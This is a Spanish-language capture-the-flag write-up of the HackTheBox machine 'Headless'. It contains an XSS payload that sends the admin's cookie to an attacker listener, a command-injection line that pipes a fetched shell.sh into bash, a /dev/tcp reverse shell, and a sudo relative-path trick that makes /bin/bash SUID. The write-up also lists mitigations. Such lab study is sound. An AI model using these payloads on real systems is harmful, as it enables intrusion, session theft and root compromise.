@@ -1,0 +1,226 @@
+---
+title: "Headless"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Easy"
+date: 2026-10-17
+tags: ["flask", "xss", "cookie-theft", "command-injection", "sudo", "path-abuse"]
+summary: "XSS reflejado en la cabecera User-Agent para robar la cookie de sesión del administrador, command injection en el panel de admin para RCE, y escalada a root abusando de un script sudo que invoca otro por ruta relativa."
+---
+
+import Callout from "../../components/Callout.astro";
+
+## Resumen
+
+Máquina Linux de dificultad *easy* centrada en seguridad web. La cadena completa:
+
+1. **XSS reflejado** en la cabecera `User-Agent`, renderizada en el panel interno del administrador.
+2. **Robo de cookie** de sesión del admin (`document.cookie`, sin flag `HttpOnly`).
+3. **Command injection** en el formulario del dashboard de administrador → RCE.
+4. **Privesc a root** vía un binario `sudo` que ejecuta un script por ruta relativa.
+
+---
+
+## Reconocimiento
+
+### Escaneo de puertos
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 10.129.85.97
+```
+
+Dos puertos abiertos:
+
+| Puerto | Servicio | Detalle |
+|--------|----------|---------|
+| 22/tcp | SSH | OpenSSH |
+| 5000/tcp | HTTP | Werkzeug httpd 2.2.2 (Python 3.11.2) |
+
+<Callout type="tip">
+Un escaneo básico etiquetaba el 5000 como `upnp`. Es una **suposición** basada en `nmap-services`, no una detección real. El `-sV` confirmó que es **Werkzeug** — el servidor de desarrollo de **Flask**. Regla: el nombre de servicio en un scan sin fingerprinting es hipótesis, no hecho.
+</Callout>
+
+### La cookie firmada
+
+Al navegar la web (`/support`), el navegador recibe una cookie con formato característico de Flask:
+
+```
+is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+```
+
+Decodificando la primera parte:
+
+```bash
+echo 'InVzZXIi' | base64 -d
+# "user"
+```
+
+Es un valor JSON (`"user"`) seguido de una **firma HMAC**. Cambiar `"user"` por `"admin"` no sirve: el servidor recalcula la firma con una *secret key* que no conocemos, así que una cookie manipulada se rechaza. **No se puede forjar sin la clave** → hay que robar una cookie ya firmada.
+
+---
+
+## Foothold
+
+### XSS en el User-Agent
+
+El formulario de `/support` detecta caracteres sospechosos en el cuerpo y responde con un *"Hacking Attempt Detected"*, incluyendo este aviso:
+
+> a report with your browser information has been sent to the administrators for investigation.
+
+La "browser information" es la cabecera `User-Agent`, que un administrador revisa en un panel interno. Como ese valor lo controlamos por completo y se renderiza sin sanitizar, tenemos un **XSS almacenado/reflejado** en el contexto del admin.
+
+**Confirmación** con un listener propio:
+
+```bash
+python3 -m http.server 8000
+```
+
+Petición a `/support` con el `User-Agent` modificado:
+
+```http
+User-Agent: <img src="http://10.10.14.52:8000/xss_test">
+```
+
+A los pocos segundos, el bot del admin abre el report y el navegador carga la "imagen":
+
+```
+10.129.85.97 - - "GET /xss_test HTTP/1.1" 404 -
+```
+
+XSS confirmado: ejecución de contenido en el navegador del administrador.
+
+### Robo de la cookie de admin
+
+La cookie no tiene flag `HttpOnly` (verificado en DevTools → Storage → Cookies), así que `document.cookie` puede leerla. Payload en el `User-Agent`:
+
+```html
+<script>new Image().src="http://10.10.14.52:8000/?c="+document.cookie;</script>
+```
+
+El navegador del admin entrega su propia cookie firmada:
+
+```
+GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+```
+
+```bash
+echo 'ImFkbWluIg' | base64 -d
+# "admin"
+```
+
+<Callout type="note">
+La firma `dmzDkZNEm6CK0oyL1fbM-SnXpH0` es válida porque la calculó el propio servidor. El ataque evita el problema de la *secret key*: en lugar de firmar nosotros, dejamos que el admin nos entregue una cookie ya firmada.
+</Callout>
+
+### Acceso al dashboard
+
+Sustituyendo la cookie por la del admin se accede a una ruta protegida descubierta por fuzzing:
+
+```
+GET /dashboard
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+```
+
+El panel ("Administrator Dashboard") ofrece un *"Generate a website health report"* con un campo de fecha.
+
+### Command injection → RCE
+
+El "health report" ejecuta comandos del sistema con la fecha como input, sin sanitizar. Encadenando con `;`:
+
+```
+date=2023-09-15; curl http://10.10.14.52:8000/rce
+```
+
+(url-encoded en el envío). El callback aparece en el listener → **RCE confirmado**.
+
+Para una shell interactiva, se sirve un `shell.sh` y se ejecuta desde el pipe:
+
+```bash
+# shell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.52/4444 0>&1
+```
+
+```
+date=2023-09-15; curl http://10.10.14.52:8000/shell.sh | bash
+```
+
+```bash
+nc -lvnp 4444
+# conexión entrante como usuario dvir
+```
+
+`user.txt` es legible por `dvir`.
+
+---
+
+## Escalada de privilegios
+
+### Enumeración sudo
+
+```bash
+sudo -l
+```
+
+```
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+```
+
+`syscheck` es un script custom legible:
+
+```bash
+cat /usr/bin/syscheck
+```
+
+Todas las utilidades se invocan con **ruta absoluta** (`/usr/bin/find`, `/usr/bin/df`...), menos una línea al final:
+
+```bash
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+fi
+```
+
+### Abuso de ruta relativa
+
+`./initdb.sh` se ejecuta **como root** (el script corre vía sudo) y **desde el directorio de trabajo actual**, no desde una ruta fija. Controlamos ese fichero:
+
+```bash
+cd ~
+cat > initdb.sh <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x initdb.sh
+
+sudo /usr/bin/syscheck
+```
+
+El script pone el bit **SUID** en `/bin/bash` con permisos de root:
+
+```bash
+ls -la /bin/bash
+# -rwsr-xr-x 1 root root ... /bin/bash
+
+/bin/bash -p
+id
+# euid=0(root)
+```
+
+<Callout type="warning">
+El flag `-p` es imprescindible: sin él, bash descarta el EUID elevado al arrancar y se obtiene una shell sin privilegios. Con `-p` mantiene el EUID de root.
+</Callout>
+
+`root.txt` capturada. ✅
+
+---
+
+## Lecciones y mitigaciones
+
+| Eslabón | Mitigación |
+|---------|------------|
+| XSS en User-Agent | Sanitizar/escapar toda entrada reflejada en el panel de admin |
+| Robo de cookie | Flag `HttpOnly` (y `SameSite`) en la cookie de sesión |
+| Command injection | No pasar input de usuario a la shell; usar APIs/listas de argumentos |
+| Ruta relativa en script root | Invocar `initdb.sh` por **ruta absoluta** — un solo cambio lo blinda |
